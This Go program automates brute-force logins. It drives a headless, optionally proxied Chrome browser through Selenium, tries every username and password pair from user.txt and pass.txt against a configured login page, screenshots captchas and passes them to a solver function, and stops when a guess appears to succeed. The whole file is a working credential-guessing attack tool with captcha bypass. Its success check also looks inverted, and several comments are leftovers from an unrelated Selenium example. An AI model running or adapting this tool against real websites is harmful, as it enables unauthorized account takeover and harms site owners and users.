package main

import (
	"autologon/pkg"
	"encoding/base64"
	"fmt"
	"github.com/tebeka/selenium"
	"github.com/tebeka/selenium/chrome"
	"io/ioutil"
	"log"
	"time"
)

func main() {
	port := pkg.GetRandomPort()
	// 设置Chrome选项
	opts := []selenium.ServiceOption{}
	caps := selenium.Capabilities{"browserName": "chrome"}
	chromeCaps := chrome.Capabilities{
		Path: "",
		Args: []string{
			"--disable-gpu",
			"--window-size=1280,800",
		},
	}
	// 设置无头模式
	if pkg.Config.Headless {
		chromeCaps.Args = append(chromeCaps.Args, "--headless")
	}
	// 设置代理
	if pkg.Config.Proxy != "" {
		chromeCaps.Args = append(chromeCaps.Args, fmt.Sprintf("--proxy-server=%s", pkg.Config.Proxy))
	}
	caps.AddChrome(chromeCaps)

	// 启动Selenium服务
	service, err := selenium.NewChromeDriverService(pkg.Config.BrowserPath, port, opts...)
	if err != nil {
		panic(err)
	}
	defer service.Stop()

	usernames, err := pkg.ReadLines(pkg.GetRootPath() + "\\user.txt")
	if err != nil {
		log.Fatalf("Read user.txt error:%v", err)
	}

	passwords, err := pkg.ReadLines(pkg.GetRootPath() + "\\pass.txt")
	if err != nil {
		log.Fatalf("Read pass.txt error:%v", err)
	}

	// 连接到Chrome浏览器
	wd, err := selenium.NewRemote(caps, fmt.Sprintf("http://localhost:%d/wd/hub", port))
	if err != nil {
		panic(err)
	}

	// Navigate to the simple playground interface.
	if err := wd.Get(pkg.Config.TargetURL); err != nil {
		log.Fatalf("wd.Get error:%v", err)
	}

	for _, username := range usernames {
		for _, password := range passwords {

			// 用户名
			// Get a reference to the text box containing code.
			user, err := wd.FindElement(selenium.ByXPATH, pkg.Config.UserinputXpath)
			if err != nil {
				log.Fatalf("wd.FindElement error:%v", err)
			}
			// Remove the boilerplate code already in the text box.
			if err := user.Clear(); err != nil {
				log.Fatalf("elem.Clear error:%v", err)
			}

			// Enter some new code in text box.
			if err := user.SendKeys(username); err != nil {
				log.Fatalf("elem.SendKeys error:%v", err)
			}

			// 密码
			// Get a reference to the text box containing code.
			pass, err := wd.FindElement(selenium.ByXPATH, pkg.Config.PassinputXpath)
			if err != nil {
				log.Fatalf("wd.FindElement error:%v", err)
			}
			// Remove the boilerplate code already in the text box.
			if err := pass.Clear(); err != nil {
				log.Fatalf("elem.Clear error:%v", err)

			}
			// Enter some new code in text box.
			if err := pass.SendKeys(password); err != nil {
				log.Fatalf("elem.SendKeys error:%v", err)
			}

			if pkg.Config.Captchaon {
				// 验证码图片
				// Get a reference to the text box containing code.
				captchaimg, err := wd.FindElement(selenium.ByXPATH, pkg.Config.CaptchaimgXpath)
				if err != nil {
					log.Fatalf("wd.FindElement error:%v", err)
				}
				screenshot, err := captchaimg.Screenshot(true)
				if err != nil {
					log.Fatalf("captchaimg.Screenshot error:%v", err)
				}
				if err := ioutil.WriteFile("captcha.png", screenshot, 0644); err != nil {
					log.Fatalf("ioutil.WriteFile error:%v", err)
				}

				// 读取图片文件的内容
				fileContent, err := ioutil.ReadFile("captcha.png")
				if err != nil {
					log.Fatalf("ioutil.ReadFile error: %v", err)
				}

				// 将图片内容编码为 base64
				encoded := base64.StdEncoding.EncodeToString(fileContent)

				// 验证码
				// Get a reference to the text box containing code.
				captcha, err := wd.FindElement(selenium.ByXPATH, pkg.Config.CaptchainputXpath)
				if err != nil {
					log.Fatalf("wd.FindElement error:%v", err)
				}
				// Remove the boilerplate code already in the text box.
				if err := captcha.Clear(); err != nil {
					log.Fatalf("elem.Clear error:%v", err)
				}
				// Enter some new code in text box.
				if err := captcha.SendKeys(pkg.GetImg(encoded)); err != nil {
					log.Fatalf("elem.SendKeys error:%v", err)
				}
			}

			// 登录按钮
			// Get a reference to the text box containing code.
			login, err := wd.FindElement(selenium.ByXPATH, pkg.Config.LoginbuttonXpath)
			if err != nil {
				log.Fatalf("wd.FindElement error:%v", err)
			}

			if err := login.Click(); err != nil {
				log.Fatalf("login.Click error:%v", err)
			}
			time.Sleep(time.Duration(pkg.Config.TimeintervalMs) * time.Millisecond)
			// 检测是否有弹窗
			text, err := wd.AlertText()
			if err == nil {
				log.Println("用户名:", username, "密码:", password, "提示:", text)
			} else {
				log.Println("用户名:", username, "密码:", password)
			}

			source, err := wd.PageSource()
			if err != nil {
				log.Fatalf("wd.PageSource error:%v", err)
			}
			excludeRegex := pkg.Config.BodyExcludeRegex
			if pkg.ContainsString(excludeRegex, source) {
				log.Println("用户名:", username, "密码:", password, "登陆成功")
				return
			} else {
				fmt.Println(excludeRegex)
				log.Println("用户名:", username, "密码:", password, "响应结果匹配到过滤字符")
				wd.Refresh()
			}

			//if !pkg.StringInString(regex, source) {
			//					log.Println("用户名:", username, "密码:", password, "登陆成功")
			//					return
			//				} else {
			//					log.Println("用户名:", username, "密码:", password, "响应结果匹配到", regex)
			//				}
		}

	}

}
